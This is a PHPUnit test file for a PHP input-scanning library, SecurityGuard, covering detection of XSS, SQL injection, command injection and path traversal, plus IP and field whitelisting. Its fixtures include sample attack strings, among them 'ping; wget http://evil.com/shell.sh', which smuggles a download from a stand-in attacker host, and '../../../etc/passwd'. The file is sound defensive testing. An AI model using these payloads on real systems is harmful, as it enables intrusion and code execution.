<?php

declare(strict_types=1);

/**
 * Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz
 */

namespace Erikwang2013\Security\Tests\Core;

use Erikwang2013\Security\SecurityGuard;
use Erikwang2013\Security\ThreatResult;
use PHPUnit\Framework\TestCase;

class SecurityGuardTest extends TestCase
{
    private array $config;

    protected function setUp(): void
    {
        SecurityGuard::reset();
        $this->config = require dirname(__DIR__, 2) . '/config/security.php';
    }

    protected function tearDown(): void
    {
        SecurityGuard::reset();
    }

    public function testInitWithEnabledFalseDoesNotCreateChain(): void
    {
        $this->config['enabled'] = false;
        SecurityGuard::init($this->config);

        $threats = SecurityGuard::guard(['x' => '<script>alert(1)</script>']);
        $this->assertEmpty($threats, 'Global enabled=false should skip ALL detection');
    }

    public function testGuardDetectsXss(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard(['comment' => '<script>alert(1)</script>']);

        $this->assertNotEmpty($threats);
        $this->assertInstanceOf(ThreatResult::class, $threats[0]);
    }

    public function testGuardDetectsSqlInjection(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard(['id' => '1 union select password from users']);

        $this->assertNotEmpty($threats);
    }

    public function testGuardDetectsCommandInjection(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard(['cmd' => 'ping; wget http://evil.com/shell.sh']);

        $this->assertNotEmpty($threats);
    }

    public function testGuardDetectsPathTraversal(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard(['file' => '../../../etc/passwd']);

        $this->assertNotEmpty($threats);
    }

    public function testSafeInputReturnsEmpty(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard([
            'name' => 'John Doe',
            'email' => 'john@example.com',
            'age' => '25',
            'city' => 'New York',
        ]);

        $this->assertEmpty($threats, 'Normal user input should not trigger any detector');
    }

    public function testWhitelistFieldsAreSkipped(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard([
            '_token' => '<script>alert(1)</script>',
        ]);

        $this->assertEmpty($threats, 'Whitelisted field _token should be skipped');
    }

    public function testIpWhitelistCidr(): void
    {
        $this->config['whitelist_ips'] = ['192.168.1.0/24'];
        SecurityGuard::init($this->config);

        $threats = SecurityGuard::guard(
            ['x' => '<script>alert(1)</script>'],
            ['ip' => '192.168.1.50']
        );

        $this->assertEmpty($threats, 'IP in whitelisted CIDR range should skip detection');
    }

    public function testIpWhitelistExactMatch(): void
    {
        $this->config['whitelist_ips'] = ['10.0.0.1'];
        SecurityGuard::init($this->config);

        $threats = SecurityGuard::guard(
            ['x' => '<script>alert(1)</script>'],
            ['ip' => '10.0.0.1']
        );

        $this->assertEmpty($threats);
    }

    public function testNonWhitelistedIpStillDetected(): void
    {
        $this->config['whitelist_ips'] = ['192.168.1.0/24'];
        SecurityGuard::init($this->config);

        $threats = SecurityGuard::guard(
            ['x' => '<script>alert(1)</script>'],
            ['ip' => '203.0.113.50']
        );

        $this->assertNotEmpty($threats, 'Non-whitelisted IP should still be scanned');
    }

    public function testShouldBlockReturnsTrueWhenBlockMode(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard(['x' => '<script>alert(1)</script>']);

        $this->assertTrue(SecurityGuard::shouldBlock($threats));
    }

    public function testShouldBlockReturnsFalseForLogMode(): void
    {
        $this->config['detectors']['xss']['mode'] = 'log';
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard(['x' => '<script>alert(1)</script>']);

        $this->assertFalse(SecurityGuard::shouldBlock($threats));
    }

    public function testEmptyArrayReturnsNoThreats(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard([]);

        $this->assertEmpty($threats);
    }

    public function testAutoInitLoadsDefaultConfig(): void
    {
        // Don't call init — guard() should auto-init from default config
        SecurityGuard::reset();
        $threats = SecurityGuard::guard(['x' => '<script>alert(1)</script>']);

        $this->assertNotEmpty($threats);
    }

    public function testBlockStatusCodeDefault(): void
    {
        SecurityGuard::init($this->config);
        $this->assertSame(403, SecurityGuard::blockStatusCode());
    }

    public function testBlockStatusCodeCustom(): void
    {
        $this->config['block_status_code'] = 406;
        SecurityGuard::init($this->config);
        $this->assertSame(406, SecurityGuard::blockStatusCode());
    }

    public function testBlockMessageDefault(): void
    {
        SecurityGuard::init($this->config);
        $this->assertSame('Request blocked by security policy', SecurityGuard::blockMessage());
    }

    // IPv6 CIDR tests

    public function testIpv6CidrWhitelist(): void
    {
        $this->config['whitelist_ips'] = ['::1/128'];
        SecurityGuard::init($this->config);

        $threats = SecurityGuard::guard(
            ['x' => '<script>alert(1)</script>'],
            ['ip' => '::1']
        );
        $this->assertEmpty($threats, 'IPv6 loopback in CIDR whitelist should skip');
    }

    public function testIpv6CidrNonMatch(): void
    {
        $this->config['whitelist_ips'] = ['fe80::/10'];
        SecurityGuard::init($this->config);

        $threats = SecurityGuard::guard(
            ['x' => '<script>alert(1)</script>'],
            ['ip' => '2001:db8::1']
        );
        $this->assertNotEmpty($threats, 'IPv6 outside CIDR range should be scanned');
    }

    // Nested array flattening tests

    public function testFlattenNestedArrayDetectsAttack(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard([
            'user' => [
                'profile' => [
                    'bio' => '<script>alert(1)</script>',
                ],
            ],
        ]);

        $this->assertNotEmpty($threats, '3-level nested XSS should be detected');
        $this->assertStringContainsString('user.profile.bio', $threats[0]->field);
    }

    public function testFlattenMixedArray(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard([
            'name' => 'safe',
            'nested' => ['deep' => "1' union select password from users--"],
        ]);

        $this->assertNotEmpty($threats);
    }

    public function testFlattenSkipsNonStringLeaves(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard([
            'arr' => [1, 2, 3],
            'bool' => true,
        ]);

        $this->assertEmpty($threats, 'Non-string nested values should be skipped');
    }

    // Whitelist field in nested arrays

    public function testWhitelistFieldInNestedArray(): void
    {
        SecurityGuard::init($this->config);
        $threats = SecurityGuard::guard([
            '_token' => '<script>alert(1)</script>',
        ]);
        $this->assertEmpty($threats, 'Top-level whitelisted field should be skipped');
    }
}
